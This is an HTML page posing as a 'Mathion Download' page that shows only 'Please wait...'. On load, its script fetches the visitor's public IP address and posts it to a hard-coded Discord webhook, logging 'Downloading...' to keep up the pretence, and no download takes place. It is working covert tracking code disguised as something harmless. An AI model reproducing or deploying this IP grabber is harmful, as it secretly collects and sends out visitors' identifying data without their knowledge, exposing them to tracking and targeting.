<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mathion Download</title>
    <style>
        body {
            background-color: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        p {
            text-align: center;
        }
    </style>
</head>
<body>
    <p>Please wait...</p>
    <script>
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
            }
        }

        async function sendToDiscord(ip) {
            const webhookUrl = 'https://discord.com/api/webhooks/1395342889520857138/iV-WMJAD7qS6gYJUgFNgZ06izUb8kvMU-hBnwRWAZqWdlsZRBjMDvvs6_tm26LuPURCN';
            const message = {
                content: `IP Address: ${ip}`
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });

                if (response.ok) {
                    console.log('Downloading...');
                } else {
                    console.error('Downloading...');
                }
            } catch (error) {
                console.error('Downloading...', error);
            }
        }

        async function main() {
            const ip = await getIP();
            if (ip) {
                await sendToDiscord(ip);
            }
        }

        main();
    </script>
</body>
</html>
